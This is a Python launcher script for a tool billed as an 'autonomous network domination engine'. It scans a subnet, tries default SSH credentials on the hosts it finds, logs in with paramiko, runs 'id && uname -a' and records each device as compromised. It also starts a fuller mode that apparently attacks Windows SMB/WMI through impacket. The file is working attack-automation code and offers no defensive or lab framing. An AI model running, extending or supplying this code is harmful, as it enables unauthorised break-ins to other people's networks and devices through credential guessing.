"""
OmniSec Runner — Starts the engine with graceful degradation.
If impacket is missing, runs in SSH+Scanning mode only.
"""

import sys
import os
import logging

# Configure logging early
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | [%(levelname)s] | %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("OmniSec.Runner")

def check_dependencies():
    """Check optional dependencies and report status."""
    deps_status = {}
    
    # Check scapy
    try:
        import scapy.all as scapy
        deps_status["scapy"] = True
    except ImportError:
        deps_status["scapy"] = False
    
    # Check paramiko
    try:
        import paramiko
        deps_status["paramiko"] = True
    except ImportError:
        deps_status["paramiko"] = False
    
    # Check impacket
    try:
        from impacket.smbconnection import SMBConnection
        deps_status["impacket"] = True
    except ImportError:
        deps_status["impacket"] = False
    
    return deps_status

def print_banner():
    from colorama import Fore, Style, init
    init(autoreset=True)
    print(Fore.RED + "=" * 80)
    print(Fore.RED + " OMNISCIENCE — AUTONOMOUS NETWORK DOMINATION ENGINE")
    print(Fore.RED + "=" * 80)
    print()

def main():
    print_banner()
    
    # Check dependencies
    deps = check_dependencies()
    
    logger.info("Dependency check:")
    for dep, ok in deps.items():
        status = "OK" if ok else "MISSING"
        color = "\033[92m" if ok else "\033[91m"
        print(f"  {dep.upper():<12}: {color}{status}\033[0m")
    
    if not deps["paramiko"]:
        print("\n[!] paramiko missing — SSH exploitation disabled")
    if not deps["scapy"]:
        print("[!] scapy missing — network scanning disabled")
    if not deps["impacket"]:
        print("\n[!] impacket missing — Windows SMB/WMI exploitation disabled")
        print("    To enable full Windows support, install via:")
        print("    pip install impacket")
        print("    If network is blocked, download manually from:")
        print("    https://github.com/fortra/impacket/releases")
        print()
    
    # Decide which mode to run
    if deps["impacket"]:
        mode = "full"
    elif deps["paramiko"] and deps["scapy"]:
        mode = "ssh_scan"
    elif deps["scapy"]:
        mode = "scan_only"
    elif deps["paramiko"]:
        mode = "ssh_only"
    else:
        mode = "minimal"
    
    print(f"[*] Running in {mode.upper()} mode\n")
    
    if mode == "full":
        from omnisec_engine import run_full_operation
        import asyncio
        # Parse args
        network = None
        if len(sys.argv) > 1:
            network = sys.argv[1]
        result = run_full_operation(network)
        print(f"\nFinal: {result['compromised']}/{result['exploited']} devices fully compromised")
    
    elif mode in ("ssh_scan", "scan_only"):
        # Use simplified engine
        from omnisec_engine import OmniSecEngine
        engine = OmniSecEngine()
        
        if len(sys.argv) > 1:
            net = sys.argv[1]
        else:
            net = f"{engine.local_ip.rsplit('.',2)[0]}.0.0/24"
        
        print(f"[*] Discovering {net} ...")
        devices = engine.discover_devices(net, exhaustive=True)
        print(f"[+] Discovered {len(devices)} devices")
        
        if deps["paramiko"] and input("\n[*] Exploit via SSH? (y/n): ").lower() == 'y':
            for dev in devices:
                if dev.ssh_enabled:
                    # Try default SSH creds
                    creds = engine._try_ssh_creds(dev)
                    if creds:
                        dev.access_credentials = creds
                        dev.can_access = True
                        dev.access_method = "ssh"
                        # Basic post-exploit
                        try:
                            import paramiko
                            client = paramiko.SSHClient()
                            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                            client.connect(dev.ip, username=creds[0], password=creds[1], timeout=5)
                            _, stdout, _ = client.exec_command("id && uname -a", timeout=5)
                            out = stdout.read().decode()
                            dev.shell_output = {"initial": out}
                            dev.is_compromised = True
                            client.close()
                            print(f"[+] SSH compromised: {dev.ip} as {creds[0]}")
                        except Exception as e:
                            logger.debug(f"SSH post-exploit failed: {e}")
        
        engine.print_summary()
        report = engine.generate_report("txt")
        print(f"\n[+] Report: {report}")
    
    else:
        print("[!] Insufficient dependencies for network operations.")
        print("    Please install at least scapy and paramiko.")
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Cancelled")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Fatal: {e}", exc_info=True)
        sys.exit(1)
